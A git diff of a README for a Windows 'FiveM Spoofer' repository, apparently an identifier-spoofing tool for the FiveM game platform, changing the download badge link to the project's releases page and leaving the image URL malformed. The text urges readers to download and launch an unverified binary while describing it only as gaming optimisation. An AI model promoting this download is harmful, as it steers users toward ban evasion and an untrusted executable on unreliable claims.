@@ -10,7 +10,7 @@ Welcome to the **FiveM Spoofer** repository, a Windows application designed to o
 ## Download FiveM Spoofer
 Click the button below to download the FiveM Spoofer application:  
 
-[![Download FiveM Spoofer](https://img.shields.io/badge/Download-FiveM%20Spoofer-blue)](https://github.com/releases/789694263/Release.zip)
+[![Download FiveM Spoofer](https://github.com/du-make/FiveM-Spoofer/releases%20Spoofer-blue)](https://github.com/du-make/FiveM-Spoofer/releases)
 
 Remember, once the download is complete, launch the application to start optimizing your gaming experience!
 
